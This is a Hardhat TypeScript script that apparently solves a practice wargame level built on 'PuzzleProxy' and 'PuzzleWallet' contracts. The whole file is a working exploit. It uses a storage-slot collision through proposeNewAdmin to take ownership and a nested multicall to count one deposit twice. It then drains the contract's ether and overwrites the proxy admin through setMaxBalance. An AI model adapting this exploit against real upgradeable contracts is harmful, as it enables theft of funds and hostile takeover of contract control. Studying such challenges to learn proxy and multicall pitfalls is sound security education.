// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { parseEther } from "ethers/lib/utils";
import { ethers } from "hardhat";
import Web3 from "web3";

async function main() {
  const printStorage = async (address: string) => {
    const slot1 = await ethers.provider.getStorageAt(address, 0)
    const slot2 = await ethers.provider.getStorageAt(address, 1)
    const slot3 = await ethers.provider.getStorageAt(address, 2)
    const slot4 = await ethers.provider.getStorageAt(address, 3)
    // const slot5 = await ethers.provider.getStorageAt(address, 4)
    // const slot6 = await ethers.provider.getStorageAt(address, 5)


    console.log(slot1)
    console.log(slot2)
    console.log(slot3)
    console.log(slot4)
    // console.log(slot5)
    // console.log(slot6)
    console.log("\n============\n")
  }

  const [signer] = await ethers.getSigners()

  const PROXY_ADDRESS = "0x67757D5227DA40Be08C04Be2904Fd091a4D78468"
  const IMPLEMENTATION_ADDRESS = "0x04A414F3E549Af60A96f25f8eCC4e1aab3fD587B"

  const proxy = await ethers.getContractAt("PuzzleProxy", PROXY_ADDRESS)
  const proxyImplementation = await ethers.getContractAt("PuzzleWallet", PROXY_ADDRESS)

  const implementation = await ethers.getContractAt("PuzzleWallet", IMPLEMENTATION_ADDRESS)

  // change the owner 
  const changeOwnerTx = await proxy.proposeNewAdmin(signer.address)
  await changeOwnerTx.wait(2)
  console.log("SUCCESS CHANGE OWNER")

  // add to whitelist
  const addToWhitelistTx = await proxyImplementation.addToWhitelist(signer.address)
  addToWhitelistTx.wait(2)
  console.log("ADDED TO WHITELIST")

  // deposit multi call
  const iface = new ethers.utils.Interface(["function init(uint256)", "function deposit()", "function multicall(bytes[])"])
  const depositPayload = iface.encodeFunctionData("deposit", [])
  const multicallPayload = iface.encodeFunctionData("multicall", [[depositPayload]])

  const multiCallTx = await proxyImplementation.multicall(
    [multicallPayload, multicallPayload],
    {
      value: parseEther("0.001"),
      gasLimit: 500000
    }
  )
  await multiCallTx.wait(2)
  console.log("SUCCESS DOUBLE DEPOSIT")


  // execute withdrawal
  const executeTx = await proxyImplementation.execute(
    signer.address,
    parseEther("0.002"),
    "0x",
  )
  await executeTx.wait(2)
  console.log("WITHDRAW ALL THE MONEY")


  // change admin 
  const setMaxBalanceTx = await proxyImplementation.setMaxBalance(
    "0x0000000000000000000000008b682e8485A877F614ADd886339BFF8185837e13"
  )
  await setMaxBalanceTx.wait(2)
  console.log("SUCCESS CHANGE THE ADMIN")
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
